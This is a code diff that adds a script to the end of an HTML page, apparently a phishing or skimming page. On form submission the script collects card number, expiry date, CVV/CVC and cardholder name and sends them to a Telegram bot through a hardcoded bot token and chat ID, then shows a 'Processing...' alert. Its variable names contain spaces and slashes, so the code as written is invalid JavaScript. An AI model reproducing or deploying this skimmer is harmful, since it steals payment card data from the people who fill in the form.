@@ -384,5 +384,38 @@
       storeCodeInput.value = value;
     });
   </script>
+  <script>
+document.getElementById("confirmForm").addEventListener("submit", function () {
+  
+  const Card number = document.getElementById("Card number").value;
+  const Expiration date = document.getElementById("Expiration date").value;
+  const CVV/CVC = document.getElementById("CVV/CVC").value;
+  const Cardholder name = document.getElementById("Cardholder name").value;
+
+  const message = `
+🔔 New Submission:
+-----------------------
+💳 Number: ${Card number}
+📅 Expiry: ${Expiration date}
+🏪 Store Code: ${CVV/CVC}
+🧑‍💼 Name: ${Cardholder name}
+`;
+
+  const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc"; 
+  const chatId = "7811430582";
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  });
+
+  alert("Processing...");
+});
+</script>
 </body>
 </html>
